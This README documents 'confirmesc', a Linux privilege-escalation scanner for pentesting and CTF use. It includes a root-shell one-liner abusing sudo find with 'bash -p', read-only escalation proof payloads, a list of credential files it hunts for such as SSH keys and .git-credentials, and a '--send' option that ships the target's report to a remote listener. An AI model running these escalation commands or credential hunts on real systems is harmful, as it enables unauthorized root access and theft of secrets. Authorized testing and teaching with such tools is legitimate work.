<p align="center">
  <img src="assets/banner.png" alt="confirmesc - confirm what is actually exploitable, not just list it" width="760">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/platform-Linux-0b7285" alt="Linux">
  <img src="https://img.shields.io/badge/python-3.9%2B-2b8a3e" alt="Python 3.9+">
  <img src="https://img.shields.io/badge/license-MIT-2f9e44" alt="MIT License">
  <img src="https://img.shields.io/badge/tests-69%20passing-37b24d" alt="Tests passing">
  <img src="https://img.shields.io/badge/output-text%20%7C%20json%20%7C%20html-1864ab" alt="Output formats">
</p>

# confirmesc

*powered by tmrswrr*

**A Linux privilege-escalation scanner that confirms what is actually
exploitable on the target - and hands you the exact command to become root.**

Most enumeration tools dump hundreds of "maybe interesting" lines and leave
the hard part to you: figuring out which ones are real, then searching the web
for a working exploit. `confirmesc` does the opposite. It verifies each finding
directly against the live system, labels it with an honest confidence level,
and for every confirmed vector it prints a **ready-to-run command that actually
gets you a root shell**. No guessing which of 200 lines matter, and no opening
GTFOBins in another tab to look up the payload.

It is built for pentesters, CTF / Hack The Box players, and system
administrators who want a clear answer to one question: *can this box be
escalated right now, and how?*

## Why confirmesc is different

Other tools stop at "here is a list, go investigate." confirmesc finishes the job:

| | Classic enumerators<br>(LinEnum, linPEAS) | GTFOBins<br>(reference site) | **confirmesc** |
|---|:---:|:---:|:---:|
| Lists suspicious items | Yes - hundreds of lines | - | Yes, but only what matters |
| **Confirms it is actually exploitable** on *this* box | No | No | **Yes - verified live** |
| **Gives you the exact exploit command** | No | You look it up by hand | **Yes - printed, ready to paste** |
| Works around the `dash`/`bash` privilege drop* | No | No - classic one-liners often fail | **Yes** |
| Can prove root for real (`euid == 0`) | No | No | **Yes - with `--poc`** |
| Honest confidence levels, not raw noise | No | - | **Yes - `CONFIRMED` / `LIKELY` / `INFO`** |

The four things that set it apart:

1. **It confirms, it does not just guess.** A finding is only marked
   `CONFIRMED` when the exploitable condition itself was directly observed on
   the running system - a real SUID bit on a known binary, a real dangerous
   capability, an authorized `sudo -l` rule, a genuinely writable root-owned
   file. Not "this version is probably vulnerable." Actually verified.

2. **It gives you the payload, so you never have to search for it.** Every
   confirmed SUID / sudo / capability vector comes with a copy-paste command
   that spawns an interactive root shell. You do not need to open GTFOBins,
   match the technique, and adapt the one-liner by hand - confirmesc already
   did that and wrote the working command into the report.

3. **Its exploit commands actually work on modern boxes.** On current
   Debian / Kali, `/bin/sh` is `dash`, and both `dash` and `bash` silently
   drop root the moment they notice `euid != ruid`. Many copy-pasted GTFOBins
   one-liners fail because of this. confirmesc generates commands that account
   for it (explicit `setuid(0)`, `bash -p`, or a direct `exec()`), so the
   shell you get is really root.

4. **It can prove root, live.** With `--poc` it does not just assert the
   conditions are right - it runs the real escalation payload and checks that
   the resulting process truly has `euid 0`, turning "exploitable in theory"
   into "we got root just now."

<sub>* A real, verified Linux shell hardening behavior, not a bug: a non-`-p`
shell resets privileges when it detects `euid != ruid`.</sub>

## Demo

An unprivileged user runs `confirmesc`, gets three `CONFIRMED` vectors each
with a ready-to-run root shell, pastes one, and lands a root shell - recorded
live in the `testlab/` Docker sandbox.

<p align="center">
  <img src="assets/demo.gif" alt="confirmesc demo: unprivileged user to root in the testlab sandbox" width="820">
</p>

## Quick start

```bash
git clone https://github.com/capture0x/confirmesc
cd confirmesc
python3 -m pip install -e .

confirmesc            # passive scan of the current box, readable text report
```

Read the top of the report: the `ACTIONABLE FINDINGS` section lists every
`CONFIRMED` vector, each with a highlighted `root shell:` line you can copy and
run. That is the whole workflow - scan, read the confirmed findings, run the
command.

No install needed on the target? Drop a single self-contained file instead
(see [Install & run](#install--run)).

## Confidence levels

confirmesc never hides behind vague wording. Every finding carries one of four
levels so you know exactly how much to trust it:

| Level       | Meaning |
|-------------|---------|
| `CONFIRMED` | The exploitable condition itself was directly observed (a real writable root-cron file, a real SUID bit on a known GTFOBins binary, a real dangerous capability, an authorized `sudo -l` rule). Not a guess. |
| `LIKELY`    | A strong indicator matched (typically a version string against a known-CVE range), but distro backports or extra runtime conditions could still block it - verify manually. |
| `INFO`      | Context worth knowing, not itself an escalation path (e.g. an unclassified SUID binary not in the curated GTFOBins table - flagged for manual review, not asserted exploitable). |
| `ERROR`     | The check itself could not complete (missing tool, permission denied). |

The process exit code is `1` if any `CONFIRMED` finding exists and `0`
otherwise, which makes it easy to use in CI or CTF automation.

## What it checks

- **SUID/SGID + `sudo -l`**, cross-referenced against a curated [GTFOBins](https://gtfobins.github.io/) table
- **14 curated high-impact CVEs** (Dirty Pipe, Dirty COW, two OverlayFS bugs, Netfilter/nf_tables x2 including the widely-weaponized CVE-2024-1086, PTRACE_TRACEME, io_uring, Sudo Baron Samedit, sudo `-1` uid bypass, sudoedit EDITOR escape, PwnKit, polkit D-Bus bypass) via exact, branch-aware version comparison
- **Cron / systemd / `$PATH`** entries writable by the current user that a root-run scheduler will execute
- **Cron wildcard injection** - `tar`/`rsync`/`chown`/`chmod`/`zip`/`7z` run with an unquoted `*` from a directory you can write into (the classic GTFOBins "Wildcards" technique)
- **Capabilities** (`getcap -r /`) and **critical file** (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, ...) writability
- **Group-membership escalation**: `docker`/`lxd`/`lxc`/`disk` group membership combined with actually-verified socket/device access
- **NFS `no_root_squash`** exports (server-side, parsed from `/etc/exports`) and NFS client mounts worth a manual look
- **sudo `env_keep`** exposing `LD_PRELOAD`/`LD_LIBRARY_PATH`/`PYTHONPATH`/`PERL5LIB` to an authorized sudo rule
- **Credential recon**: SSH private keys, `.git-credentials`/`.netrc`/`.my.cnf`/`.pgpass`/`wp-config.php`/`.env`, and shell history files that belong to another user but are readable by you anyway

## Ready-to-run exploit commands (no GTFOBins search needed)

This is the feature that saves you the most time. For every `CONFIRMED`
SUID / sudo / capability finding whose binary has a verified-reliable recipe
(`find`, `bash`, `python`/`python2`/`python3`, `perl`, `ruby`), confirmesc
writes a complete `exploit_command` into the report - a line you can copy and
run to drop straight into an interactive root shell. For example:

```text
3/3 [CONFIRMED] Exploitable sudo rule: /usr/bin/find
  root shell: sudo /usr/bin/find . -maxdepth 0 -exec /bin/bash -p \; -quit
```

You do not look anything up. You do not adapt a one-liner. You copy the line
and you are root.

**confirmesc never runs this command for you**, in any mode (including
`--poc`). It is printed for you to decide on, exactly like the PoC a manual
pentest report would suggest. It appears as a highlighted `root shell:` line in
the text report, a green box in the HTML report, and the `exploit_command` key
in JSON.

## Three confirmation tiers: passive, active, PoC

By default `confirmesc` is **fully passive** - it only reads file metadata,
runs read-only commands (`find`, `getcap`, `sudo -n -l`, `uname -r`, ...),
and never writes to disk or executes an exploit.

**`--active`** allows one additional, still non-destructive step per
finding: running a suspected binary with a harmless flag (`--version`,
`--help`) to confirm it is a real, live executable rather than a dangling
symlink. This never spawns a shell, never writes a file, and is always
time-boxed (3s).

**`--poc`** goes further and is genuinely invasive: for every SUID / sudo /
capability vector we have a curated payload for (`find`, `python`/`python2`/
`python3`, `perl`, `ruby`, `php`, `node`, `lua`, `awk`/`gawk`, `bash`, and
unrestricted `sudo ALL` rules), it **actually runs the real GTFOBins
escalation payload** and checks whether the resulting process really has
`euid == 0`. That flips a finding from "the conditions for exploitation are
real" (CONFIRMED-by-condition) to "we actually got root, right now"
(CONFIRMED-by-execution) - the strongest claim a privesc tool can make
without leaving state behind.

Every `--poc` payload is deliberately a single read-only `id -u` proof
(e.g. `find . -maxdepth 0 -exec /usr/bin/id -u ;`, `python3 -c "import os;
os.system('id -u')"`, `bash -p -c "id -u"`) - no interactive shell is ever
spawned, no file is written, nothing persists. A failed attempt only ever
prints an unprivileged uid instead of `0`; it does not downgrade the
CONFIRMED-by-condition finding, it just notes the discrepancy so you know
live exploitation did not line up with the GTFOBins reference on this box.

> **Only use `--poc` against systems you are explicitly authorized to test**
> (your own systems, a CTF, or an engagement with signed authorization). It
> will attempt real privilege escalation.

## Install & run

```bash
git clone https://github.com/capture0x/confirmesc
cd confirmesc
python3 -m pip install -e .

confirmesc                       # passive scan, text report
confirmesc --active              # + harmless binary probes
confirmesc --poc                 # + real exploitation proof (authorized systems only)
confirmesc --format json -o out.json
confirmesc --format html -o report.html   # shareable, collapsible HTML report
confirmesc --category suid_sgid_sudo --min-confidence LIKELY
confirmesc --quiet               # suppress the "[*] <check> done (Ns)" progress lines
confirmesc --send http://<YOUR-IP>:8000   # also submit the report to a confirmesc-recv listener
```

Checks run concurrently (thread pool, I/O-bound), so a full scan is typically
dominated by the single slowest check (usually the SUID/SGID `find /` walk
or `getcap -r /`) rather than the sum of all of them.

Run it without installing:

```bash
python3 -m confirmesc.cli
```

Or build a single portable file to drop on a target (no pip install needed there):

```bash
# stage the package under its own name so it stays importable inside the archive,
# then build the zipapp from that staging dir:
mkdir -p build/pyz && cp -r confirmesc build/pyz/
python3 -m zipapp build/pyz -m "confirmesc.cli:main" -o confirmesc.pyz -p "/usr/bin/env python3"
# transfer confirmesc.pyz to the target, then:
python3 confirmesc.pyz --no-color
```

See `testlab/` for a local Docker-based vulnerable sandbox to watch `--poc`
actually gain root, without needing an external target like Hack The Box.

## Collecting the report on your own machine (`--send`)

When reading the terminal on the target is inconvenient, run a small listener
on your own box and have the scan submit its finished report back to it. The
scan still runs locally on the target with the same tested check code; only
the completed JSON report travels back, where it is re-rendered and saved with
the target's own hostname and timing.

```bash
# on YOUR machine:
confirmesc-recv --port 8000 --save-format html     # listens, prints and saves each report

# on the target:
confirmesc --send http://<YOUR-IP>:8000            # scans locally, then submits the report
```

`confirmesc-recv` options: `--host`/`--port` to bind, `--save-dir` for where to
write received reports, and `--save-format text|json|html`.

## Known limitations

- `--poc` only covers vectors with a curated non-interactive payload (see list above). Editor/pager GTFOBins entries (`vim`, `less`, `man`, ...) need a TTY and are condition-only for now.
- Writable cron/systemd targets are confirmed by write-access, not by actually waiting for the scheduler to fire and observing root execution - that would require a real (if reversible) wait/trigger step and is not implemented yet.
- Kernel/sudo/polkit CVE matches are version-string based (`LIKELY`); a distro can backport a fix without changing the version string, so always cross-check against your distro's advisory before relying on one. Fixed-version numbers for the less common CVEs are best-effort from public writeups and may be off by a point release on some branches.
- `docker`/`lxd` group escalation and `sudo env_keep` findings are condition-only by design: proving them live would mean spinning up a real container or compiling and writing a shared object to disk, which breaks the "never writes to disk / never leaves running state" guarantee every other PoC in this tool holds to.
- Cron wildcard injection detection uses a lightweight statement splitter, not a real shell parser - quoted `;`/`&&` inside strings, or wildcards built up across multiple variables, can be missed or (rarely) misattributed to the wrong working directory.
- The GTFOBins and CVE tables are curated subsets, not a full scrape - extend them as you hit binaries/CVEs they do not cover yet.

## Extending

- Add binaries to `confirmesc/data/gtfobins.json` (`{"suid": bool, "sudo": bool, "capability": bool, "poc_args": [...], "cap_poc_args": [...]}`). `poc_args`/`cap_poc_args` are optional argv lists appended after the binary path - keep payloads read-only (print a uid, nothing else).
- Add CVEs to `confirmesc/data/cve_matrix.json` (`min_version`, optional `branch_fixes`, `default_fixed_at`).
- Add a new check by subclassing `confirmesc.core.base.Check` and registering it in `confirmesc/checks/__init__.py`.

## Project design rules

- **General-purpose, target-agnostic**: no check may hardcode a hostname, IP, username, or CTF-specific path. Every check must work against any Linux box.
- **No destructive actions ever**, even under `--active`. If a proposed check needs to modify system state to confirm something, it stays passive/heuristic (labeled `LIKELY`/`INFO`) instead.

## Responsible use

confirmesc is a tool for authorized security testing and education: your own
systems, CTF / Hack The Box targets, or engagements you have written permission
to test. Running privilege-escalation checks, and especially `--poc`, against
systems you do not own or have no authorization to assess may be illegal. You
are responsible for how you use it.

## License

MIT - see [LICENSE](LICENSE).
